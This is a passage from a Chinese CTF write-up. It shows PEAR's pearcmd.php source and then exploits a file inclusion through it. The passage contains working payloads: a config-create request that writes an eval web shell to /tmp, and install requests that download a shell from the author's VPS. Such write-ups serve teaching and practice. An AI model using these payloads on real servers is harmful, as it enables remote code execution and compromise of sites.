class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return help string for specified command</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $command Command to return help for</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> void</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cmdHelp</span>(<span class="hljs-params"><span class="hljs-variable">$command</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$progname</span>, <span class="hljs-variable">$all_commands</span>, <span class="hljs-variable">$config</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;options&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span><br>        <span class="hljs-string">&quot;Options:\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -v         increase verbosity level (default 1)\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -q         be quiet, decrease verbosity level\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -c file    find user configuration in `file&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -C file    find system configuration in `file&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -G         start in graphical (Gtk) mode\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -s         store user configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -S         store system configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -u foo     unset `foo&#x27; in the user configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -h, -?     display help/usage (this message)\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -V         version information\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;shortcuts&quot;</span>) &#123;<br>        <span class="hljs-variable">$sc</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getShortcuts</span>();<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-string">&quot;Shortcuts:\n&quot;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$sc</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$s</span> =&gt; <span class="hljs-variable">$c</span>) &#123;<br>            <span class="hljs-variable">$ret</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;     %-8s %s\n&quot;</span>, <span class="hljs-variable">$s</span>, <span class="hljs-variable">$c</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br><br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;version&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PEAR Version: &quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;pear_package_version&#x27;</span>].<br>               <span class="hljs-string">&quot;\nPHP Version: &quot;</span>.<span class="hljs-title function_ invoke__">phpversion</span>().<br>               <span class="hljs-string">&quot;\nZend Engine Version: &quot;</span>.<span class="hljs-title function_ invoke__">zend_version</span>().<br>               <span class="hljs-string">&quot;\nRunning on: &quot;</span>.<span class="hljs-title function_ invoke__">php_uname</span>();<br><br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$help</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getHelp</span>(<span class="hljs-variable">$command</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$help</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> [options] <span class="hljs-subst">$help</span>\n&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$help</span>[<span class="hljs-number">1</span>] === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> <span class="hljs-subst">$help</span>[0]&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> [options] <span class="hljs-subst">$help</span>[0]\n<span class="hljs-subst">$help</span>[1]&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Command &#x27;<span class="hljs-subst">$command</span>&#x27; is not valid, try &#x27;<span class="hljs-subst">$progname</span> help&#x27;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// &#125;&#125;&#125;</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * error_handler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $errno  Error number</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $errmsg Message</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $file   Filename</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $line   Line number</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@access</span> public</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> boolean</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errmsg</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$line</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$errno</span> &amp; E_STRICT) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// E_STRICT</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$errno</span> &amp; E_DEPRECATED) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// E_DEPRECATED</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-title function_ invoke__">error_reporting</span>() &amp; <span class="hljs-variable">$errno</span>) &amp;&amp;<br>        <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>]) &amp;&amp;<br>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>]-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) &lt; <span class="hljs-number">4</span><br>    ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// @silenced error, show all if debug is high enough</span><br>    &#125;<br>    <span class="hljs-variable">$errortype</span> = <span class="hljs-keyword">array</span> (<br>        E_DEPRECATED  =&gt; <span class="hljs-string">&#x27;Deprecated Warning&#x27;</span>,<br>        E_ERROR   =&gt;  <span class="hljs-string">&quot;Error&quot;</span>,<br>        E_WARNING   =&gt;  <span class="hljs-string">&quot;Warning&quot;</span>,<br>        E_PARSE   =&gt;  <span class="hljs-string">&quot;Parsing Error&quot;</span>,<br>        E_STRICT  =&gt; <span class="hljs-string">&#x27;Strict Warning&#x27;</span>,<br>        E_NOTICE   =&gt;  <span class="hljs-string">&quot;Notice&quot;</span>,<br>        E_CORE_ERROR  =&gt;  <span class="hljs-string">&quot;Core Error&quot;</span>,<br>        E_CORE_WARNING  =&gt;  <span class="hljs-string">&quot;Core Warning&quot;</span>,<br>        E_COMPILE_ERROR  =&gt;  <span class="hljs-string">&quot;Compile Error&quot;</span>,<br>        E_COMPILE_WARNING =&gt;  <span class="hljs-string">&quot;Compile Warning&quot;</span>,<br>        E_USER_ERROR =&gt;  <span class="hljs-string">&quot;User Error&quot;</span>,<br>        E_USER_WARNING =&gt;  <span class="hljs-string">&quot;User Warning&quot;</span>,<br>        E_USER_NOTICE =&gt;  <span class="hljs-string">&quot;User Notice&quot;</span><br>    );<br>    <span class="hljs-variable">$prefix</span> = <span class="hljs-variable">$errortype</span>[<span class="hljs-variable">$errno</span>];<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_PEAR_PHPDIR</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$_PEAR_PHPDIR</span>)) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_PEAR_PHPDIR</span>) + <span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\n<span class="hljs-subst">$prefix</span>: <span class="hljs-subst">$errmsg</span> in <span class="hljs-subst">$file</span> on line <span class="hljs-subst">$line</span>\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Local variables:</span><br><span class="hljs-comment"> * tab-width: 4</span><br><span class="hljs-comment"> * c-basic-offset: 4</span><br><span class="hljs-comment"> * indent-tabs-mode: nil</span><br><span class="hljs-comment"> * mode: php</span><br><span class="hljs-comment"> * End:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// vim600:syn=php</span><br><br></code></pre></td></tr></table></figure></details><p>切过去看看，可以看到<code>register_argc_argv</code>是开启的</p><p><img src="/posts/29460/image-20231026125928324.png" alt="image-20231026125928324"></p><p>这时候就可以利用<code>$_SERVER[‘argv’]</code>来传递命令给<code>pearcmd</code></p><h3 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h3><p><code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_GET[0]);?&gt;+/tmp/shell.php</code></p><p>浏览器访问行不通，<code>&lt;</code>，<code>&gt;</code>会被<code>urlencode</code></p><p><img src="/posts/29460/image-20231026133801572.png" alt="image-20231026133801572"></p><p>所以使用Burp拦截修改提交的参数</p><p><img src="/posts/29460/image-20231026134010084.png" alt="image-20231026134010084"></p><p>接着蚁剑连接就行了（<del>其实有时候，我更喜欢用<code>$_GET</code>，懒得开蚁剑</del></p><p><img src="/posts/29460/image-20231026134042781.png" alt="image-20231026134042781"></p><h3 id="install（出网"><a href="#install（出网" class="headerlink" title="install（出网"></a>install（出网</h3><p>在自己vps上开个端口，写个shell，这里用的<code>$_GET</code></p><p><img src="/posts/29460/image-20231026134439674.png" alt="image-20231026134439674"></p><ul><li><p><code>?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[host]:[port]/shell.php</code></p><p><img src="/posts/29460/image-20231026134628923.png" alt="image-20231026134628923"></p><p>可以看到shell被保存在了<code>/var/www/html/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download/shell.php</code></p><p>但是貌似读不到（压根没写进去？</p><blockquote><p>参考中这样解释的：</p><blockquote><p>&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;路径下面，这里我在使用的时候会遇到一些有关配置方面的问题，因为名为&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;的文件夹是新创建的，而我并没有权限对其进行写操作而导致利用失败。</p></blockquote></blockquote></li><li><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://[host]:[port]/shell.php</code></p><p><img src="/posts/29460/image-20231026135720181.png" alt="image-20231026135720181"></p><p>可以看到shell被保存到了<code>/tmp/tmp/pear/download/shell.php</code></p><p>这次就可以读了</p><p><img src="/posts/29460/image-20231026140047638.png" alt="image-20231026140047638"></p></li></ul><p><em><strong><center><font color="#81ecec" size="5">viking{shui_bu_zhao_naozibaozhale}</font></center></strong></em></p><h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF-Recruits</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
